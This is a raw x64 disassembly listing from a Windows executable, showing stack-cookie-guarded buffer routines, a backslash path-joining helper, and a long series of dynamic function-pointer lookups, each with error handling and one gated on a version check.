   140002d65:	e8 e6 5e 00 00       	call   0x140008c50
   140002d6a:	48 2b e0             	sub    %rax,%rsp
   140002d6d:	48 8b 05 9c f2 02 00 	mov    0x2f29c(%rip),%rax        # 0x140032010
   140002d74:	48 33 c4             	xor    %rsp,%rax
   140002d77:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   140002d7e:	00 
   140002d7f:	48 8b d1             	mov    %rcx,%rdx
   140002d82:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002d88:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002d8d:	e8 1e 2d 00 00       	call   0x140005ab0
   140002d92:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002d97:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002d9c:	e8 1b c2 00 00       	call   0x14000efbc
   140002da1:	33 c9                	xor    %ecx,%ecx
   140002da3:	85 c0                	test   %eax,%eax
   140002da5:	0f 94 c1             	sete   %cl
   140002da8:	8b c1                	mov    %ecx,%eax
   140002daa:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140002db1:	00 
   140002db2:	48 33 cc             	xor    %rsp,%rcx
   140002db5:	e8 56 5e 00 00       	call   0x140008c10
   140002dba:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   140002dc1:	c3                   	ret
   140002dc2:	cc                   	int3
   140002dc3:	cc                   	int3
   140002dc4:	cc                   	int3
   140002dc5:	cc                   	int3
   140002dc6:	cc                   	int3
   140002dc7:	cc                   	int3
   140002dc8:	cc                   	int3
   140002dc9:	cc                   	int3
   140002dca:	cc                   	int3
   140002dcb:	cc                   	int3
   140002dcc:	cc                   	int3
   140002dcd:	cc                   	int3
   140002dce:	cc                   	int3
   140002dcf:	cc                   	int3
   140002dd0:	40 53                	rex push %rbx
   140002dd2:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   140002dd9:	48 8b 05 30 f2 02 00 	mov    0x2f230(%rip),%rax        # 0x140032010
   140002de0:	48 33 c4             	xor    %rsp,%rax
   140002de3:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   140002dea:	00 
   140002deb:	48 8b da             	mov    %rdx,%rbx
   140002dee:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002df4:	48 8b d1             	mov    %rcx,%rdx
   140002df7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002dfc:	e8 af 2c 00 00       	call   0x140005ab0
   140002e01:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140002e07:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002e0c:	48 8b d3             	mov    %rbx,%rdx
   140002e0f:	e8 9c 2c 00 00       	call   0x140005ab0
   140002e14:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002e19:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002e1e:	e8 19 c7 00 00       	call   0x14000f53c
   140002e23:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   140002e2a:	00 
   140002e2b:	48 33 cc             	xor    %rsp,%rcx
   140002e2e:	e8 dd 5d 00 00       	call   0x140008c10
   140002e33:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140002e3a:	5b                   	pop    %rbx
   140002e3b:	c3                   	ret
   140002e3c:	cc                   	int3
   140002e3d:	cc                   	int3
   140002e3e:	cc                   	int3
   140002e3f:	cc                   	int3
   140002e40:	48 83 ec 28          	sub    $0x28,%rsp
   140002e44:	49 8b c0             	mov    %r8,%rax
   140002e47:	4c 8b c2             	mov    %rdx,%r8
   140002e4a:	48 8b d0             	mov    %rax,%rdx
   140002e4d:	e8 3e c4 00 00       	call   0x14000f290
   140002e52:	33 c9                	xor    %ecx,%ecx
   140002e54:	48 85 c0             	test   %rax,%rax
   140002e57:	0f 95 c1             	setne  %cl
   140002e5a:	8b c1                	mov    %ecx,%eax
   140002e5c:	48 83 c4 28          	add    $0x28,%rsp
   140002e60:	c3                   	ret
   140002e61:	cc                   	int3
   140002e62:	cc                   	int3
   140002e63:	cc                   	int3
   140002e64:	cc                   	int3
   140002e65:	cc                   	int3
   140002e66:	cc                   	int3
   140002e67:	cc                   	int3
   140002e68:	cc                   	int3
   140002e69:	cc                   	int3
   140002e6a:	cc                   	int3
   140002e6b:	cc                   	int3
   140002e6c:	cc                   	int3
   140002e6d:	cc                   	int3
   140002e6e:	cc                   	int3
   140002e6f:	cc                   	int3
   140002e70:	e9 cb fd ff ff       	jmp    0x140002c40
   140002e75:	cc                   	int3
   140002e76:	cc                   	int3
   140002e77:	cc                   	int3
   140002e78:	cc                   	int3
   140002e79:	cc                   	int3
   140002e7a:	cc                   	int3
   140002e7b:	cc                   	int3
   140002e7c:	cc                   	int3
   140002e7d:	cc                   	int3
   140002e7e:	cc                   	int3
   140002e7f:	cc                   	int3
   140002e80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002e85:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002e8a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002e8f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002e94:	41 56                	push   %r14
   140002e96:	48 83 ec 20          	sub    $0x20,%rsp
   140002e9a:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140002e9e:	49 8b f8             	mov    %r8,%rdi
   140002ea1:	48 8b ea             	mov    %rdx,%rbp
   140002ea4:	48 8b f1             	mov    %rcx,%rsi
   140002ea7:	48 85 c9             	test   %rcx,%rcx
   140002eaa:	75 42                	jne    0x140002eee
   140002eac:	48 8b c3             	mov    %rbx,%rax
   140002eaf:	90                   	nop
   140002eb0:	80 7c 10 01 00       	cmpb   $0x0,0x1(%rax,%rdx,1)
   140002eb5:	48 8d 40 01          	lea    0x1(%rax),%rax
   140002eb9:	75 f5                	jne    0x140002eb0
   140002ebb:	48 8b cb             	mov    %rbx,%rcx
   140002ebe:	66 90                	xchg   %ax,%ax
   140002ec0:	41 80 7c 08 01 00    	cmpb   $0x0,0x1(%r8,%rcx,1)
   140002ec6:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140002eca:	75 f4                	jne    0x140002ec0
   140002ecc:	4c 8d 34 08          	lea    (%rax,%rcx,1),%r14
   140002ed0:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140002ed4:	e8 fb 7e 00 00       	call   0x14000add4
   140002ed9:	48 8b f0             	mov    %rax,%rsi
   140002edc:	48 85 c0             	test   %rax,%rax
   140002edf:	0f 84 ad 00 00 00    	je     0x140002f92
   140002ee5:	4d 8d 46 02          	lea    0x2(%r14),%r8
   140002ee9:	48 8b c8             	mov    %rax,%rcx
   140002eec:	eb 06                	jmp    0x140002ef4
   140002eee:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002ef4:	33 d2                	xor    %edx,%edx
   140002ef6:	e8 25 6b 00 00       	call   0x140009a20
   140002efb:	4c 8b c3             	mov    %rbx,%r8
   140002efe:	66 90                	xchg   %ax,%ax
   140002f00:	49 ff c0             	inc    %r8
   140002f03:	41 80 3c 28 00       	cmpb   $0x0,(%r8,%rbp,1)
   140002f08:	75 f6                	jne    0x140002f00
   140002f0a:	48 8b d5             	mov    %rbp,%rdx
   140002f0d:	48 8b ce             	mov    %rsi,%rcx
   140002f10:	e8 0b b7 00 00       	call   0x14000e620
   140002f15:	48 8b c3             	mov    %rbx,%rax
   140002f18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002f1f:	00 
   140002f20:	80 7c 06 01 00       	cmpb   $0x0,0x1(%rsi,%rax,1)
   140002f25:	48 8d 40 01          	lea    0x1(%rax),%rax
   140002f29:	75 f5                	jne    0x140002f20
   140002f2b:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   140002f30:	74 0e                	je     0x140002f40
   140002f32:	66 c7 04 30 5c 00    	movw   $0x5c,(%rax,%rsi,1)
   140002f38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002f3f:	00 
   140002f40:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   140002f45:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140002f49:	75 f5                	jne    0x140002f40
   140002f4b:	80 7c 3b ff 5c       	cmpb   $0x5c,-0x1(%rbx,%rdi,1)
   140002f50:	75 11                	jne    0x140002f63
   140002f52:	4c 8d 43 fe          	lea    -0x2(%rbx),%r8
   140002f56:	48 8b d7             	mov    %rdi,%rdx
   140002f59:	48 8b ce             	mov    %rsi,%rcx
   140002f5c:	e8 9f c0 00 00       	call   0x14000f000
   140002f61:	eb 2c                	jmp    0x140002f8f
   140002f63:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
   140002f67:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002f6e:	00 00 
   140002f70:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140002f74:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140002f78:	75 f6                	jne    0x140002f70
   140002f7a:	33 d2                	xor    %edx,%edx
   140002f7c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002f80:	0f b6 04 17          	movzbl (%rdi,%rdx,1),%eax
   140002f84:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002f87:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140002f8b:	84 c0                	test   %al,%al
   140002f8d:	75 f1                	jne    0x140002f80
   140002f8f:	48 8b c6             	mov    %rsi,%rax
   140002f92:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f97:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002f9c:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002fa1:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002fa6:	48 83 c4 20          	add    $0x20,%rsp
   140002faa:	41 5e                	pop    %r14
   140002fac:	c3                   	ret
   140002fad:	cc                   	int3
   140002fae:	cc                   	int3
   140002faf:	cc                   	int3
   140002fb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002fb5:	57                   	push   %rdi
   140002fb6:	48 83 ec 20          	sub    $0x20,%rsp
   140002fba:	8b fa                	mov    %edx,%edi
   140002fbc:	48 8b d9             	mov    %rcx,%rbx
   140002fbf:	48 8d 15 ea f8 01 00 	lea    0x1f8ea(%rip),%rdx        # 0x1400228b0
   140002fc6:	ff 15 64 f0 01 00    	call   *0x1f064(%rip)        # 0x140022030
   140002fcc:	48 89 05 75 fb 02 00 	mov    %rax,0x2fb75(%rip)        # 0x140032b48
   140002fd3:	48 85 c0             	test   %rax,%rax
   140002fd6:	75 21                	jne    0x140002ff9
   140002fd8:	48 8d 15 f1 f8 01 00 	lea    0x1f8f1(%rip),%rdx        # 0x1400228d0
   140002fdf:	48 8d 0d 22 f9 01 00 	lea    0x1f922(%rip),%rcx        # 0x140022908
   140002fe6:	e8 75 eb ff ff       	call   0x140001b60
   140002feb:	83 c8 ff             	or     $0xffffffff,%eax
   140002fee:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002ff3:	48 83 c4 20          	add    $0x20,%rsp
   140002ff7:	5f                   	pop    %rdi
   140002ff8:	c3                   	ret
   140002ff9:	48 8d 15 18 f9 01 00 	lea    0x1f918(%rip),%rdx        # 0x140022918
   140003000:	48 8b cb             	mov    %rbx,%rcx
   140003003:	ff 15 27 f0 01 00    	call   *0x1f027(%rip)        # 0x140022030
   140003009:	48 89 05 20 fb 02 00 	mov    %rax,0x2fb20(%rip)        # 0x140032b30
   140003010:	48 85 c0             	test   %rax,%rax
   140003013:	75 21                	jne    0x140003036
   140003015:	48 8d 15 1c f9 01 00 	lea    0x1f91c(%rip),%rdx        # 0x140022938
   14000301c:	48 8d 0d e5 f8 01 00 	lea    0x1f8e5(%rip),%rcx        # 0x140022908
   140003023:	e8 38 eb ff ff       	call   0x140001b60
   140003028:	83 c8 ff             	or     $0xffffffff,%eax
   14000302b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003030:	48 83 c4 20          	add    $0x20,%rsp
   140003034:	5f                   	pop    %rdi
   140003035:	c3                   	ret
   140003036:	48 8d 15 33 f9 01 00 	lea    0x1f933(%rip),%rdx        # 0x140022970
   14000303d:	48 8b cb             	mov    %rbx,%rcx
   140003040:	ff 15 ea ef 01 00    	call   *0x1efea(%rip)        # 0x140022030
   140003046:	48 89 05 cb fa 02 00 	mov    %rax,0x2facb(%rip)        # 0x140032b18
   14000304d:	48 85 c0             	test   %rax,%rax
   140003050:	75 21                	jne    0x140003073
   140003052:	48 8d 15 27 f9 01 00 	lea    0x1f927(%rip),%rdx        # 0x140022980
   140003059:	48 8d 0d a8 f8 01 00 	lea    0x1f8a8(%rip),%rcx        # 0x140022908
   140003060:	e8 fb ea ff ff       	call   0x140001b60
   140003065:	83 c8 ff             	or     $0xffffffff,%eax
   140003068:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000306d:	48 83 c4 20          	add    $0x20,%rsp
   140003071:	5f                   	pop    %rdi
   140003072:	c3                   	ret
   140003073:	48 8d 15 36 f9 01 00 	lea    0x1f936(%rip),%rdx        # 0x1400229b0
   14000307a:	48 8b cb             	mov    %rbx,%rcx
   14000307d:	ff 15 ad ef 01 00    	call   *0x1efad(%rip)        # 0x140022030
   140003083:	48 89 05 b6 fa 02 00 	mov    %rax,0x2fab6(%rip)        # 0x140032b40
   14000308a:	48 85 c0             	test   %rax,%rax
   14000308d:	75 21                	jne    0x1400030b0
   14000308f:	48 8d 15 3a f9 01 00 	lea    0x1f93a(%rip),%rdx        # 0x1400229d0
   140003096:	48 8d 0d 6b f8 01 00 	lea    0x1f86b(%rip),%rcx        # 0x140022908
   14000309d:	e8 be ea ff ff       	call   0x140001b60
   1400030a2:	83 c8 ff             	or     $0xffffffff,%eax
   1400030a5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030aa:	48 83 c4 20          	add    $0x20,%rsp
   1400030ae:	5f                   	pop    %rdi
   1400030af:	c3                   	ret
   1400030b0:	48 8d 15 51 f9 01 00 	lea    0x1f951(%rip),%rdx        # 0x140022a08
   1400030b7:	48 8b cb             	mov    %rbx,%rcx
   1400030ba:	ff 15 70 ef 01 00    	call   *0x1ef70(%rip)        # 0x140022030
   1400030c0:	48 89 05 59 fa 02 00 	mov    %rax,0x2fa59(%rip)        # 0x140032b20
   1400030c7:	48 85 c0             	test   %rax,%rax
   1400030ca:	75 21                	jne    0x1400030ed
   1400030cc:	48 8d 15 45 f9 01 00 	lea    0x1f945(%rip),%rdx        # 0x140022a18
   1400030d3:	48 8d 0d 2e f8 01 00 	lea    0x1f82e(%rip),%rcx        # 0x140022908
   1400030da:	e8 81 ea ff ff       	call   0x140001b60
   1400030df:	83 c8 ff             	or     $0xffffffff,%eax
   1400030e2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030e7:	48 83 c4 20          	add    $0x20,%rsp
   1400030eb:	5f                   	pop    %rdi
   1400030ec:	c3                   	ret
   1400030ed:	48 8d 15 54 f9 01 00 	lea    0x1f954(%rip),%rdx        # 0x140022a48
   1400030f4:	48 8b cb             	mov    %rbx,%rcx
   1400030f7:	ff 15 33 ef 01 00    	call   *0x1ef33(%rip)        # 0x140022030
   1400030fd:	48 89 05 4c fa 02 00 	mov    %rax,0x2fa4c(%rip)        # 0x140032b50
   140003104:	48 85 c0             	test   %rax,%rax
   140003107:	75 21                	jne    0x14000312a
   140003109:	48 8d 15 50 f9 01 00 	lea    0x1f950(%rip),%rdx        # 0x140022a60
   140003110:	48 8d 0d f1 f7 01 00 	lea    0x1f7f1(%rip),%rcx        # 0x140022908
   140003117:	e8 44 ea ff ff       	call   0x140001b60
   14000311c:	83 c8 ff             	or     $0xffffffff,%eax
   14000311f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003124:	48 83 c4 20          	add    $0x20,%rsp
   140003128:	5f                   	pop    %rdi
   140003129:	c3                   	ret
   14000312a:	48 8d 15 67 f9 01 00 	lea    0x1f967(%rip),%rdx        # 0x140022a98
   140003131:	48 8b cb             	mov    %rbx,%rcx
   140003134:	ff 15 f6 ee 01 00    	call   *0x1eef6(%rip)        # 0x140022030
   14000313a:	48 89 05 e7 f9 02 00 	mov    %rax,0x2f9e7(%rip)        # 0x140032b28
   140003141:	48 85 c0             	test   %rax,%rax
   140003144:	75 21                	jne    0x140003167
   140003146:	48 8d 15 5b f9 01 00 	lea    0x1f95b(%rip),%rdx        # 0x140022aa8
   14000314d:	48 8d 0d b4 f7 01 00 	lea    0x1f7b4(%rip),%rcx        # 0x140022908
   140003154:	e8 07 ea ff ff       	call   0x140001b60
   140003159:	83 c8 ff             	or     $0xffffffff,%eax
   14000315c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003161:	48 83 c4 20          	add    $0x20,%rsp
   140003165:	5f                   	pop    %rdi
   140003166:	c3                   	ret
   140003167:	48 8d 15 6a f9 01 00 	lea    0x1f96a(%rip),%rdx        # 0x140022ad8
   14000316e:	48 8b cb             	mov    %rbx,%rcx
   140003171:	ff 15 b9 ee 01 00    	call   *0x1eeb9(%rip)        # 0x140022030
   140003177:	48 89 05 ba f9 02 00 	mov    %rax,0x2f9ba(%rip)        # 0x140032b38
   14000317e:	48 85 c0             	test   %rax,%rax
   140003181:	75 21                	jne    0x1400031a4
   140003183:	48 8d 15 5e f9 01 00 	lea    0x1f95e(%rip),%rdx        # 0x140022ae8
   14000318a:	48 8d 0d 77 f7 01 00 	lea    0x1f777(%rip),%rcx        # 0x140022908
   140003191:	e8 ca e9 ff ff       	call   0x140001b60
   140003196:	83 c8 ff             	or     $0xffffffff,%eax
   140003199:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000319e:	48 83 c4 20          	add    $0x20,%rsp
   1400031a2:	5f                   	pop    %rdi
   1400031a3:	c3                   	ret
   1400031a4:	48 8d 15 6d f9 01 00 	lea    0x1f96d(%rip),%rdx        # 0x140022b18
   1400031ab:	48 8b cb             	mov    %rbx,%rcx
   1400031ae:	ff 15 7c ee 01 00    	call   *0x1ee7c(%rip)        # 0x140022030
   1400031b4:	48 89 05 25 fa 02 00 	mov    %rax,0x2fa25(%rip)        # 0x140032be0
   1400031bb:	48 85 c0             	test   %rax,%rax
   1400031be:	75 21                	jne    0x1400031e1
   1400031c0:	48 8d 15 61 f9 01 00 	lea    0x1f961(%rip),%rdx        # 0x140022b28
   1400031c7:	48 8d 0d 3a f7 01 00 	lea    0x1f73a(%rip),%rcx        # 0x140022908
   1400031ce:	e8 8d e9 ff ff       	call   0x140001b60
   1400031d3:	83 c8 ff             	or     $0xffffffff,%eax
   1400031d6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400031db:	48 83 c4 20          	add    $0x20,%rsp
   1400031df:	5f                   	pop    %rdi
   1400031e0:	c3                   	ret
   1400031e1:	48 8d 15 70 f9 01 00 	lea    0x1f970(%rip),%rdx        # 0x140022b58
   1400031e8:	48 8b cb             	mov    %rbx,%rcx
   1400031eb:	ff 15 3f ee 01 00    	call   *0x1ee3f(%rip)        # 0x140022030
   1400031f1:	48 89 05 78 f9 02 00 	mov    %rax,0x2f978(%rip)        # 0x140032b70
   1400031f8:	48 85 c0             	test   %rax,%rax
   1400031fb:	75 21                	jne    0x14000321e
   1400031fd:	48 8d 15 64 f9 01 00 	lea    0x1f964(%rip),%rdx        # 0x140022b68
   140003204:	48 8d 0d fd f6 01 00 	lea    0x1f6fd(%rip),%rcx        # 0x140022908
   14000320b:	e8 50 e9 ff ff       	call   0x140001b60
   140003210:	83 c8 ff             	or     $0xffffffff,%eax
   140003213:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003218:	48 83 c4 20          	add    $0x20,%rsp
   14000321c:	5f                   	pop    %rdi
   14000321d:	c3                   	ret
   14000321e:	48 8d 15 6b f9 01 00 	lea    0x1f96b(%rip),%rdx        # 0x140022b90
   140003225:	48 8b cb             	mov    %rbx,%rcx
   140003228:	ff 15 02 ee 01 00    	call   *0x1ee02(%rip)        # 0x140022030
   14000322e:	48 89 05 2b f9 02 00 	mov    %rax,0x2f92b(%rip)        # 0x140032b60
   140003235:	48 85 c0             	test   %rax,%rax
   140003238:	75 21                	jne    0x14000325b
   14000323a:	48 8d 15 5f f9 01 00 	lea    0x1f95f(%rip),%rdx        # 0x140022ba0
   140003241:	48 8d 0d c0 f6 01 00 	lea    0x1f6c0(%rip),%rcx        # 0x140022908
   140003248:	e8 13 e9 ff ff       	call   0x140001b60
   14000324d:	83 c8 ff             	or     $0xffffffff,%eax
   140003250:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003255:	48 83 c4 20          	add    $0x20,%rsp
   140003259:	5f                   	pop    %rdi
   14000325a:	c3                   	ret
   14000325b:	48 8d 15 66 f9 01 00 	lea    0x1f966(%rip),%rdx        # 0x140022bc8
   140003262:	48 8b cb             	mov    %rbx,%rcx
   140003265:	ff 15 c5 ed 01 00    	call   *0x1edc5(%rip)        # 0x140022030
   14000326b:	48 89 05 f6 f8 02 00 	mov    %rax,0x2f8f6(%rip)        # 0x140032b68
   140003272:	48 85 c0             	test   %rax,%rax
   140003275:	75 21                	jne    0x140003298
   140003277:	48 8d 15 5a f9 01 00 	lea    0x1f95a(%rip),%rdx        # 0x140022bd8
   14000327e:	48 8d 0d 83 f6 01 00 	lea    0x1f683(%rip),%rcx        # 0x140022908
   140003285:	e8 d6 e8 ff ff       	call   0x140001b60
   14000328a:	83 c8 ff             	or     $0xffffffff,%eax
   14000328d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003292:	48 83 c4 20          	add    $0x20,%rsp
   140003296:	5f                   	pop    %rdi
   140003297:	c3                   	ret
   140003298:	48 8d 15 61 f9 01 00 	lea    0x1f961(%rip),%rdx        # 0x140022c00
   14000329f:	48 8b cb             	mov    %rbx,%rcx
   1400032a2:	ff 15 88 ed 01 00    	call   *0x1ed88(%rip)        # 0x140022030
   1400032a8:	48 89 05 a9 f8 02 00 	mov    %rax,0x2f8a9(%rip)        # 0x140032b58
   1400032af:	48 85 c0             	test   %rax,%rax
   1400032b2:	75 21                	jne    0x1400032d5
   1400032b4:	48 8d 15 55 f9 01 00 	lea    0x1f955(%rip),%rdx        # 0x140022c10
   1400032bb:	48 8d 0d 46 f6 01 00 	lea    0x1f646(%rip),%rcx        # 0x140022908
   1400032c2:	e8 99 e8 ff ff       	call   0x140001b60
   1400032c7:	83 c8 ff             	or     $0xffffffff,%eax
   1400032ca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400032cf:	48 83 c4 20          	add    $0x20,%rsp
   1400032d3:	5f                   	pop    %rdi
   1400032d4:	c3                   	ret
   1400032d5:	83 ff 1e             	cmp    $0x1e,%edi
   1400032d8:	7c 7a                	jl     0x140003354
   1400032da:	48 8d 15 5f f9 01 00 	lea    0x1f95f(%rip),%rdx        # 0x140022c40
   1400032e1:	48 8b cb             	mov    %rbx,%rcx
   1400032e4:	ff 15 46 ed 01 00    	call   *0x1ed46(%rip)        # 0x140022030
   1400032ea:	48 89 05 97 f8 02 00 	mov    %rax,0x2f897(%rip)        # 0x140032b88
   1400032f1:	48 85 c0             	test   %rax,%rax
   1400032f4:	75 21                	jne    0x140003317
   1400032f6:	48 8d 15 53 f9 01 00 	lea    0x1f953(%rip),%rdx        # 0x140022c50
   1400032fd:	48 8d 0d 04 f6 01 00 	lea    0x1f604(%rip),%rcx        # 0x140022908
   140003304:	e8 57 e8 ff ff       	call   0x140001b60
   140003309:	83 c8 ff             	or     $0xffffffff,%eax
   14000330c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003311:	48 83 c4 20          	add    $0x20,%rsp
   140003315:	5f                   	pop    %rdi
   140003316:	c3                   	ret
   140003317:	48 8d 15 5a f9 01 00 	lea    0x1f95a(%rip),%rdx        # 0x140022c78
   14000331e:	48 8b cb             	mov    %rbx,%rcx
   140003321:	ff 15 09 ed 01 00    	call   *0x1ed09(%rip)        # 0x140022030
   140003327:	48 89 05 62 f8 02 00 	mov    %rax,0x2f862(%rip)        # 0x140032b90
   14000332e:	48 85 c0             	test   %rax,%rax
   140003331:	75 21                	jne    0x140003354
   140003333:	48 8d 15 4e f9 01 00 	lea    0x1f94e(%rip),%rdx        # 0x140022c88
   14000333a:	48 8d 0d c7 f5 01 00 	lea    0x1f5c7(%rip),%rcx        # 0x140022908
   140003341:	e8 1a e8 ff ff       	call   0x140001b60
   140003346:	83 c8 ff             	or     $0xffffffff,%eax
   140003349:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000334e:	48 83 c4 20          	add    $0x20,%rsp
   140003352:	5f                   	pop    %rdi
   140003353:	c3                   	ret
   140003354:	48 8d 15 55 f9 01 00 	lea    0x1f955(%rip),%rdx        # 0x140022cb0
   14000335b:	48 8b cb             	mov    %rbx,%rcx
   14000335e:	ff 15 cc ec 01 00    	call   *0x1eccc(%rip)        # 0x140022030
   140003364:	48 89 05 0d f8 02 00 	mov    %rax,0x2f80d(%rip)        # 0x140032b78
   14000336b:	48 85 c0             	test   %rax,%rax
   14000336e:	75 21                	jne    0x140003391
   140003370:	48 8d 15 51 f9 01 00 	lea    0x1f951(%rip),%rdx        # 0x140022cc8
   140003377:	48 8d 0d 8a f5 01 00 	lea    0x1f58a(%rip),%rcx        # 0x140022908
   14000337e:	e8 dd e7 ff ff       	call   0x140001b60
   140003383:	83 c8 ff             	or     $0xffffffff,%eax
   140003386:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000338b:	48 83 c4 20          	add    $0x20,%rsp
   14000338f:	5f                   	pop    %rdi
   140003390:	c3                   	ret
   140003391:	48 8d 15 60 f9 01 00 	lea    0x1f960(%rip),%rdx        # 0x140022cf8
   140003398:	48 8b cb             	mov    %rbx,%rcx
   14000339b:	ff 15 8f ec 01 00    	call   *0x1ec8f(%rip)        # 0x140022030
   1400033a1:	48 89 05 d8 f7 02 00 	mov    %rax,0x2f7d8(%rip)        # 0x140032b80
   1400033a8:	48 85 c0             	test   %rax,%rax
   1400033ab:	75 21                	jne    0x1400033ce
   1400033ad:	48 8d 15 5c f9 01 00 	lea    0x1f95c(%rip),%rdx        # 0x140022d10
   1400033b4:	48 8d 0d 4d f5 01 00 	lea    0x1f54d(%rip),%rcx        # 0x140022908
   1400033bb:	e8 a0 e7 ff ff       	call   0x140001b60
   1400033c0:	83 c8 ff             	or     $0xffffffff,%eax
   1400033c3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400033c8:	48 83 c4 20          	add    $0x20,%rsp
   1400033cc:	5f                   	pop    %rdi
   1400033cd:	c3                   	ret
   1400033ce:	48 8d 15 6b f9 01 00 	lea    0x1f96b(%rip),%rdx        # 0x140022d40
   1400033d5:	48 8b cb             	mov    %rbx,%rcx
   1400033d8:	ff 15 52 ec 01 00    	call   *0x1ec52(%rip)        # 0x140022030
   1400033de:	48 89 05 23 f8 02 00 	mov    %rax,0x2f823(%rip)        # 0x140032c08
   1400033e5:	48 85 c0             	test   %rax,%rax
   1400033e8:	75 21                	jne    0x14000340b
   1400033ea:	48 8d 15 67 f9 01 00 	lea    0x1f967(%rip),%rdx        # 0x140022d58
   1400033f1:	48 8d 0d 10 f5 01 00 	lea    0x1f510(%rip),%rcx        # 0x140022908
   1400033f8:	e8 63 e7 ff ff       	call   0x140001b60
   1400033fd:	83 c8 ff             	or     $0xffffffff,%eax
   140003400:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003405:	48 83 c4 20          	add    $0x20,%rsp
   140003409:	5f                   	pop    %rdi
   14000340a:	c3                   	ret
   14000340b:	48 8d 15 76 f9 01 00 	lea    0x1f976(%rip),%rdx        # 0x140022d88
   140003412:	48 8b cb             	mov    %rbx,%rcx
   140003415:	ff 15 15 ec 01 00    	call   *0x1ec15(%rip)        # 0x140022030
   14000341b:	48 89 05 ee f7 02 00 	mov    %rax,0x2f7ee(%rip)        # 0x140032c10
   140003422:	48 85 c0             	test   %rax,%rax
   140003425:	75 21                	jne    0x140003448
   140003427:	48 8d 15 6a f9 01 00 	lea    0x1f96a(%rip),%rdx        # 0x140022d98
   14000342e:	48 8d 0d d3 f4 01 00 	lea    0x1f4d3(%rip),%rcx        # 0x140022908
   140003435:	e8 26 e7 ff ff       	call   0x140001b60
   14000343a:	83 c8 ff             	or     $0xffffffff,%eax
   14000343d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003442:	48 83 c4 20          	add    $0x20,%rsp
   140003446:	5f                   	pop    %rdi
   140003447:	c3                   	ret
   140003448:	48 8d 15 71 f9 01 00 	lea    0x1f971(%rip),%rdx        # 0x140022dc0
   14000344f:	48 8b cb             	mov    %rbx,%rcx
   140003452:	ff 15 d8 eb 01 00    	call   *0x1ebd8(%rip)        # 0x140022030
   140003458:	48 89 05 b9 f7 02 00 	mov    %rax,0x2f7b9(%rip)        # 0x140032c18
   14000345f:	48 85 c0             	test   %rax,%rax
   140003462:	75 21                	jne    0x140003485
   140003464:	48 8d 15 65 f9 01 00 	lea    0x1f965(%rip),%rdx        # 0x140022dd0
   14000346b:	48 8d 0d 96 f4 01 00 	lea    0x1f496(%rip),%rcx        # 0x140022908
   140003472:	e8 e9 e6 ff ff       	call   0x140001b60
   140003477:	83 c8 ff             	or     $0xffffffff,%eax
   14000347a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000347f:	48 83 c4 20          	add    $0x20,%rsp
   140003483:	5f                   	pop    %rdi
   140003484:	c3                   	ret
